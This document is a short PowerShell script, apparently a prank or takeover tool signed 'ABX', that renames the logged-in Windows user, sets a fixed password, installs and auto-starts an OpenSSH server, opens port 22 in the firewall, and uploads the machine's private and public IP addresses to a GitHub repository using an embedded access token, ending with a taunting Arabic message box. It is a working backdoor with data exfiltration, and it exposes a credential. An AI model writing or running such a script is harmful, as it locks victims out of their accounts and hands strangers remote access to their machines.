$log = "C:\Users\Public\log.txt"

$newName = "ABX_3amk"

try {
    $currentUser = $env:USERNAME
    Rename-LocalUser -Name $currentUser -NewName $newName
    Add-Content $log "Renamed $currentUser to $newName"
} catch {
    Add-Content $log "RENAME FAILED: $_"
}

net user $newName up8sWt2KB
if ($LASTEXITCODE -ne 0) {
    Add-Content $log "PASSWORD FAILED: exit code $LASTEXITCODE"
} else {
    Add-Content $log "Password changed"
}

try {
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
    Start-Sleep -Seconds 5
    Start-Service sshd
    Set-Service -Name sshd -StartupType 'Automatic'
    Add-Content $log "SSH installed and running"
} catch {
    Add-Content $log "SSH FAILED: $_"
}

New-NetFirewallRule -Name "OpenSSH" -DisplayName "OpenSSH SSH Server" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue
Add-Content $log "Done"
# Get both IPs
$privateIP = (ipconfig | Select-String "IPv4").ToString().Trim()
$publicIP = (Invoke-WebRequest -Uri "http://ifconfig.me/ip" -UseBasicParsing).Content.Trim()

$content = "Private IP:`n$privateIP`n`nPublic IP: $publicIP"
$bytes = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))

$token = "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"
$repo = "ABX532/script"
$filePath = "ip_info.txt"

$body = @{
    message = "ip update"
    content = $bytes
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/contents/$filePath" -Method PUT -Headers @{Authorization = "token $token"; "User-Agent" = "PowerShell"} -Body $body


Add-Type -AssemblyName Microsoft.VisualBasic

$result = [Microsoft.VisualBasic.Interaction]::MsgBox(
    "لا تلعب مع ABX",
    "OKOnly,Information",
    "ABX عمك"
)

Write-Host "User selected: $result" 
